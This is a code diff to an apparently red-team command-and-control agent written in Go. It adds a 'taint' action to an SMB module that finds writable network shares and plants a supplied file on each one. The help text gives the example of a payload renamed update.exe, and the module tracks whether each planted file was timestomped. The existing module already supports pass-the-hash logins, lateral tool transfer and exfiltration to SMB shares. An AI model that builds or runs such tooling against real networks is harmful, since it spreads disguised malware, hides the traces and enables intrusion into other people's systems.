@@ -17,11 +17,11 @@ func init() {
 			ScriptPath: filepath.Join(".", "fawkes", "browserscripts", "smb_new.js"),
 			Author:     "@galoryber",
 		},
-		Description:         "SMB file operations on remote shares. List shares, browse, read/write/delete files, create directories, rename/move via SMB2 with NTLM auth. Pass-the-hash support.",
-		HelpString:          "smb -action shares -host 192.168.1.1 -username user -password pass -domain DOMAIN\nsmb -action ls -host 192.168.1.1 -share C$ -username admin -hash aad3b435b51404ee:8846f7eaee8fb117 -domain DOMAIN\nsmb -action mkdir -host 192.168.1.1 -share C$ -path Users/Public/staging -username admin -password pass\nsmb -action mv -host 192.168.1.1 -share C$ -path old.txt -destination new.txt -username admin -password pass",
+		Description:         "SMB file operations on remote shares. List shares, browse, read/write/delete files, create directories, rename/move, taint shares with planted files, via SMB2 with NTLM auth. Pass-the-hash support.",
+		HelpString:          "smb -action shares -host 192.168.1.1 -username user -password pass -domain DOMAIN\nsmb -action ls -host 192.168.1.1 -share C$ -username admin -hash aad3b435b51404ee:8846f7eaee8fb117 -domain DOMAIN\nsmb -action taint -host 192.168.1.1 -source /tmp/payload.exe -plant_name update.exe -username admin -password pass\nsmb -action mv -host 192.168.1.1 -share C$ -path old.txt -destination new.txt -username admin -password pass",
 		Version:             2,
 		Author:              "@galoryber",
-		MitreAttackMappings: []string{"T1021.002", "T1550.002", "T1570"},
+		MitreAttackMappings: []string{"T1021.002", "T1550.002", "T1570", "T1080"},
 		TaskCompletionFunctions: map[string]agentstructs.PTTaskCompletionFunction{
 			"shareSweepSharesDone":    shareSweepSharesDone,
 			"shareSweepShareHuntDone": shareSweepShareHuntDone,
@@ -39,9 +39,9 @@ func init() {
 				Name:             "action",
 				CLIName:          "action",
 				ModalDisplayName: "Action",
-				Description:      "Operation: shares, ls, cat, upload, rm, mkdir, mv, push (lateral tool transfer), exfil (data exfiltration to SMB share), share-sweep (automated chain)",
+				Description:      "Operation: shares, ls, cat, upload, rm, mkdir, mv, push (lateral tool transfer), exfil (data exfiltration to SMB share), taint (plant files on writable shares), share-sweep (automated chain)",
 				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
-				Choices:          []string{"shares", "ls", "cat", "upload", "rm", "mkdir", "mv", "push", "exfil", "share-sweep"},
+				Choices:          []string{"shares", "ls", "cat", "upload", "rm", "mkdir", "mv", "push", "exfil", "taint", "share-sweep"},
 				DefaultValue:     "shares",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{ParameterIsRequired: true, GroupName: "Default"},
@@ -161,6 +161,17 @@ func init() {
 				},
 			},
 			{
+				Name:             "plant_name",
+				CLIName:          "plant_name",
+				ModalDisplayName: "Plant Filename",
+				Description:      "Filename to plant on shares (for taint action, e.g., 'update.exe', 'notes.lnk'). If empty, uses source filename.",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
+				DefaultValue:     "",
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{ParameterIsRequired: false, GroupName: "Default"},
+				},
+			},
+			{
 				Name:             "port",
 				CLIName:          "port",
 				ModalDisplayName: "SMB Port",
@@ -195,6 +206,16 @@ func init() {
 				if action == "push" {
 					source, _ := taskData.Args.GetStringArg("source")
 					msg += fmt.Sprintf(" Pushing local file '%s' to remote share — file write to remote system is a lateral tool transfer indicator (T1570).", source)
+				}
+				if action == "taint" {
+					plantName, _ := taskData.Args.GetStringArg("plant_name")
+					msg = fmt.Sprintf("OPSEC WARNING: SMB Taint Shared Content on %s. "+
+						"This will enumerate writable shares and plant file '%s' on each. "+
+						"File creation on remote shares generates: SMB write events (Event ID 5145), "+
+						"file creation audit logs, and object access events. "+
+						"DLP/EDR may detect new executables on network shares. "+
+						"Planted files persist until manually removed. "+
+						"MITRE ATT&CK: T1080 (Taint Shared Content), T1570 (Lateral Tool Transfer).", host, plantName)
 				}
 				if action == "exfil" {
 					source, _ := taskData.Args.GetStringArg("source")
@@ -235,6 +256,24 @@ func init() {
 					fmt.Sprintf("SMB exfil: %s (%d bytes) → \\\\%s\\%s\\%s",
 						exfilResult.FileName, exfilResult.TotalSize,
 						exfilResult.Host, exfilResult.Share, exfilResult.RemotePath))
+			}
+			// Track SMB taint operations
+			var taintResult struct {
+				Action  string `json:"action"`
+				Host    string `json:"host"`
+				Planted []struct {
+					Share    string `json:"share"`
+					Path     string `json:"path"`
+					Size     int    `json:"size"`
+					Stomped  bool   `json:"timestomped"`
+				} `json:"planted"`
+			}
+			if err := json.Unmarshal([]byte(responseText), &taintResult); err == nil && taintResult.Action == "taint" && len(taintResult.Planted) > 0 {
+				for _, p := range taintResult.Planted {
+					createArtifact(processResponse.TaskData.Task.ID, "File Write",
+						fmt.Sprintf("SMB taint: planted %s on \\\\%s\\%s (%d bytes, timestomped=%v)",
+							p.Path, taintResult.Host, p.Share, p.Size, p.Stomped))
+				}
 			}
 			// Track SMB operations: look for host reference in output
 			if strings.Contains(responseText, "Shares on") || strings.Contains(responseText, "SMB") {
@@ -351,6 +390,14 @@ func init() {
 				source, _ := taskData.Args.GetStringArg("source")
 				displayMsg = fmt.Sprintf("SMB push %s → \\\\%s\\%s\\%s", source, host, share, path)
 			}
+			if action == "taint" {
+				plantName, _ := taskData.Args.GetStringArg("plant_name")
+				source, _ := taskData.Args.GetStringArg("source")
+				if plantName == "" {
+					plantName = filepath.Base(source)
+				}
+				displayMsg = fmt.Sprintf("SMB taint \\\\%s — plant '%s' on writable shares", host, plantName)
+			}
 			response.DisplayParams = &displayMsg
 
 			artifactMsg := fmt.Sprintf("SMB2 %s to %s", action, host)
@@ -368,6 +415,14 @@ func init() {
 					fmt.Sprintf("[LATERAL TOOL TRANSFER] SMB push to \\\\%s\\%s\\%s", host, share, path), false)
 				tagTask(taskData.Task.ID, "LATERAL",
 					fmt.Sprintf("SMB file push to %s", host))
+			}
+
+			if action == "taint" {
+				plantName, _ := taskData.Args.GetStringArg("plant_name")
+				logOperationEvent(taskData.Task.ID,
+					fmt.Sprintf("[TAINT SHARED CONTENT] Planting '%s' on writable shares at \\\\%s (T1080)", plantName, host), false)
+				tagTask(taskData.Task.ID, "LATERAL",
+					fmt.Sprintf("SMB taint shared content on %s", host))
 			}
 
 			return response
